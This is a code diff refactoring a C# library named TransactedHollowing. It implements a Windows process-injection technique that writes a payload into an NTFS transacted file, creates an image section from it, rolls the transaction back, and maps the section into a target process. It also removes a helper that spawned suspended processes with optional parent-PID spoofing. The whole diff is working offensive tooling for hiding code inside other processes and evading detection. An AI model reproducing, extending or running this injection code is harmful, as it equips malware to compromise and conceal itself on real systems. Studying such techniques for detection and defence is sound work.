@@ -79,7 +79,7 @@ namespace TransactedHollowing.Library
             if (ntstatus != Win32Consts.STATUS_SUCCESS)
             {
                 Console.WriteLine("[-] Failed to create process parameters.");
-          
+
                 return false;
             }
 
@@ -169,108 +169,13 @@ namespace TransactedHollowing.Library
 
             if (!status)
             {
+                hProcess = IntPtr.Zero;
+                hThread = IntPtr.Zero;
                 Console.WriteLine("[-] Failed to create suspended process.");
                 Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
             }
 
             return status;
-        }
-
-
-        public static IntPtr CreateSuspendedProcess(string imagePathName, int ppid)
-        {
-            NTSTATUS ntstatus;
-            IntPtr hParent;
-            CLIENT_ID clientId;
-            string ntFilePath = string.Format(@"\??\{0}", imagePathName);
-            var objectAttributes = new OBJECT_ATTRIBUTES(
-                ntFilePath,
-                OBJECT_ATTRIBUTES_FLAGS.OBJ_CASE_INSENSITIVE);
-            IntPtr pIoStatusBlock = Marshal.AllocHGlobal(
-                Marshal.SizeOf(typeof(IO_STATUS_BLOCK)));
-
-            ntstatus = NativeMethods.NtOpenFile(
-                out IntPtr hImageFile,
-                ACCESS_MASK.FILE_READ_DATA | ACCESS_MASK.FILE_EXECUTE | ACCESS_MASK.FILE_READ_ATTRIBUTES | ACCESS_MASK.SYNCHRONIZE,
-                in objectAttributes,
-                pIoStatusBlock,
-                FILE_SHARE_ACCESS.READ | FILE_SHARE_ACCESS.DELETE,
-                FILE_OPEN_OPTIONS.SYNCHRONOUS_IO_NONALERT | FILE_OPEN_OPTIONS.NON_DIRECTORY_FILE);
-            Marshal.FreeHGlobal(pIoStatusBlock);
-
-            if (ntstatus != Win32Consts.STATUS_SUCCESS)
-            {
-                Console.WriteLine("[-] Failed to open \"{0}\".", ntFilePath);
-                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
-
-                return IntPtr.Zero;
-            }
-
-            ntstatus = NativeMethods.NtCreateSection(
-                out IntPtr hSection,
-                ACCESS_MASK.SECTION_ALL_ACCESS,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                SECTION_PROTECTIONS.PAGE_READONLY,
-                SECTION_ATTRIBUTES.SEC_IMAGE,
-                hImageFile);
-            NativeMethods.NtClose(hImageFile);
-
-            if (ntstatus != Win32Consts.STATUS_SUCCESS)
-            {
-                Console.WriteLine("[-] Failed to create section.");
-                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
-
-                return IntPtr.Zero;
-            }
-
-            if (ppid > 0)
-            {
-                objectAttributes = new OBJECT_ATTRIBUTES();
-                clientId = new CLIENT_ID { UniqueProcess = new IntPtr(ppid) };
-
-                ntstatus = NativeMethods.NtOpenProcess(
-                    out hParent,
-                    ACCESS_MASK.PROCESS_CREATE_PROCESS,
-                    in objectAttributes,
-                    in clientId);
-
-                if (ntstatus != Win32Consts.STATUS_SUCCESS)
-                {
-                    Console.WriteLine("[!] Failed to open parent process.");
-                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
-                    hParent = new IntPtr(-1);
-                }
-            }
-            else
-            {
-                hParent = new IntPtr(-1);
-            }
-
-            ntstatus = NativeMethods.NtCreateProcessEx(
-                out IntPtr hSuspendedProcess,
-                ACCESS_MASK.PROCESS_ALL_ACCESS,
-                IntPtr.Zero,
-                hParent,
-                NT_PROCESS_CREATION_FLAGS.INHERIT_HANDLES,
-                hSection,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                BOOLEAN.FALSE);
-            NativeMethods.NtClose(hSection);
-
-            if (hParent != new IntPtr(-1))
-                NativeMethods.NtClose(hParent);
-
-            if (ntstatus != Win32Consts.STATUS_SUCCESS)
-            {
-                Console.WriteLine("[-] Failed to create suspended process.");
-                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
-
-                return IntPtr.Zero;
-            }
-
-            return hSuspendedProcess;
         }
 
 
@@ -280,114 +185,111 @@ namespace TransactedHollowing.Library
         {
             NTSTATUS ntstatus;
             int error;
-            IntPtr hTransactedFile;
-            IntPtr pIoStatusBlock;
+            IntPtr hTransaction;
+            IntPtr hTransactedFile = Win32Consts.INVALID_HANDLE_VALUE;
+            IntPtr hTransactedSection = Win32Consts.INVALID_HANDLE_VALUE;
             int nSizeIoStatusBlock = Marshal.SizeOf(typeof(IO_STATUS_BLOCK));
-
-            ntstatus = NativeMethods.NtCreateTransaction(
-                out IntPtr hTransaction,
-                ACCESS_MASK.TRANSACTION_ALL_ACCESS,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                0,
-                0,
-                0,
-                IntPtr.Zero,
-                IntPtr.Zero);
-
-            if (ntstatus != Win32Consts.STATUS_SUCCESS)
-            {
-                Console.WriteLine("[-] Failed to create transaction.");
-                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
-
-                return Win32Consts.INVALID_HANDLE_VALUE;
-            }
-
-            hTransactedFile = NativeMethods.CreateFileTransacted(
-                transactedFilePath,
-                ACCESS_MASK.GENERIC_READ | ACCESS_MASK.GENERIC_WRITE,
-                0,
-                IntPtr.Zero,
-                FILE_CREATE_DISPOSITION.CREATE_ALWAYS,
-                FILE_ATTRIBUTES.NORMAL,
-                IntPtr.Zero,
-                hTransaction,
-                IntPtr.Zero,
-                IntPtr.Zero);
-
-            if (hTransactedFile == Win32Consts.INVALID_HANDLE_VALUE)
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to create transacted file.");
-                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
-                NativeMethods.NtClose(hTransaction);
-
-                return Win32Consts.INVALID_HANDLE_VALUE;
-            }
-
-            pIoStatusBlock = Marshal.AllocHGlobal(nSizeIoStatusBlock);
+            IntPtr pIoStatusBlock = Marshal.AllocHGlobal(nSizeIoStatusBlock);
             Helpers.ZeroMemory(pIoStatusBlock, nSizeIoStatusBlock);
 
-            ntstatus = NativeMethods.NtWriteFile(
-                hTransactedFile,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                pIoStatusBlock,
-                payload,
-                (uint)payload.Length,
-                IntPtr.Zero,
-                IntPtr.Zero);
+            do
+            {
+                ntstatus = NativeMethods.NtCreateTransaction(
+                    out hTransaction,
+                    ACCESS_MASK.TRANSACTION_ALL_ACCESS,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    0,
+                    0,
+                    0,
+                    IntPtr.Zero,
+                    IntPtr.Zero);
+
+                if (ntstatus != Win32Consts.STATUS_SUCCESS)
+                {
+                    Console.WriteLine("[-] Failed to create transaction.");
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
+                    hTransaction = Win32Consts.INVALID_HANDLE_VALUE;
+                    break;
+                }
+
+                hTransactedFile = NativeMethods.CreateFileTransacted(
+                    transactedFilePath,
+                    ACCESS_MASK.GENERIC_READ | ACCESS_MASK.GENERIC_WRITE,
+                    0,
+                    IntPtr.Zero,
+                    FILE_CREATE_DISPOSITION.OPEN_EXISTING,
+                    FILE_ATTRIBUTES.NORMAL,
+                    IntPtr.Zero,
+                    hTransaction,
+                    IntPtr.Zero,
+                    IntPtr.Zero);
+
+                if (hTransactedFile == Win32Consts.INVALID_HANDLE_VALUE)
+                {
+                    error = Marshal.GetLastWin32Error();
+                    Console.WriteLine("[-] Failed to create transacted file.");
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
+                    break;
+                }
+
+                ntstatus = NativeMethods.NtWriteFile(
+                    hTransactedFile,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    pIoStatusBlock,
+                    payload,
+                    (uint)payload.Length,
+                    IntPtr.Zero,
+                    IntPtr.Zero);
+
+                if (ntstatus != Win32Consts.STATUS_SUCCESS)
+                {
+                    Console.WriteLine("[-] Failed to write payload in the transacted file.");
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
+                    break;
+                }
+
+                ntstatus = NativeMethods.NtCreateSection(
+                    out hTransactedSection,
+                    ACCESS_MASK.SECTION_ALL_ACCESS,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    SECTION_PROTECTIONS.PAGE_READONLY,
+                    SECTION_ATTRIBUTES.SEC_IMAGE,
+                    hTransactedFile);
+
+                if (ntstatus != Win32Consts.STATUS_SUCCESS)
+                {
+                    Console.WriteLine("[-] Failed to create section.");
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
+                    break;
+                }
+
+                ntstatus = NativeMethods.NtRollbackTransaction(hTransaction, BOOLEAN.TRUE);
+
+                if (ntstatus != Win32Consts.STATUS_SUCCESS)
+                {
+                    Console.WriteLine("[-] Failed to rollback transaction.");
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
+                }
+            } while (false);
+
             Marshal.FreeHGlobal(pIoStatusBlock);
 
-            if (ntstatus != Win32Consts.STATUS_SUCCESS)
-            {
-                Console.WriteLine("[-] Failed to write payload in the transacted file.");
-                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
-                NativeMethods.NtClose(hTransactedFile);
+            if (hTransaction != Win32Consts.INVALID_HANDLE_VALUE)
                 NativeMethods.NtClose(hTransaction);
 
-                return Win32Consts.INVALID_HANDLE_VALUE;
-            }
-
-            ntstatus = NativeMethods.NtCreateSection(
-                out IntPtr hTransactedSection,
-                ACCESS_MASK.SECTION_ALL_ACCESS,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                SECTION_PROTECTIONS.PAGE_READONLY,
-                SECTION_ATTRIBUTES.SEC_IMAGE,
-                hTransactedFile);
-            NativeMethods.NtClose(hTransactedFile);
-
-            if (ntstatus != Win32Consts.STATUS_SUCCESS)
-            {
-                Console.WriteLine("[-] Failed to create section.");
-                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
-
-                return Win32Consts.INVALID_HANDLE_VALUE;
-            }
-
-            ntstatus = NativeMethods.NtRollbackTransaction(hTransaction, BOOLEAN.TRUE);
-            NativeMethods.NtClose(hTransaction);
-
-            if (ntstatus != Win32Consts.STATUS_SUCCESS)
-            {
-                Console.WriteLine("[-] Failed to rollback transaction.");
-                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
-                NativeMethods.NtClose(hTransactedSection);
-
-                return Win32Consts.INVALID_HANDLE_VALUE;
-            }
+            if (hTransactedFile != Win32Consts.INVALID_HANDLE_VALUE)
+                NativeMethods.NtClose(hTransactedFile);
 
             return hTransactedSection;
         }
 
 
-        public static IntPtr MapSectionToProcess(
-            IntPtr hProcess,
-            IntPtr hSection)
+        public static IntPtr MapSectionToProcess(IntPtr hProcess, IntPtr hSection)
         {
             NTSTATUS ntstatus;
             var pSectionBaseAddress = IntPtr.Zero;
@@ -397,7 +299,7 @@ namespace TransactedHollowing.Library
                 hSection,
                 hProcess,
                 ref pSectionBaseAddress,
-                UIntPtr.Zero,
+                SIZE_T.Zero,
                 SIZE_T.Zero,
                 IntPtr.Zero,
                 ref ViewSize,
@@ -410,8 +312,7 @@ namespace TransactedHollowing.Library
             {
                 Console.WriteLine("[-] Failed to map section to target process.");
                 Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
-
-                return IntPtr.Zero;
+                pSectionBaseAddress = IntPtr.Zero;
             }
             else if (ntstatus == Win32Consts.STATUS_IMAGE_NOT_AT_BASE)
             {
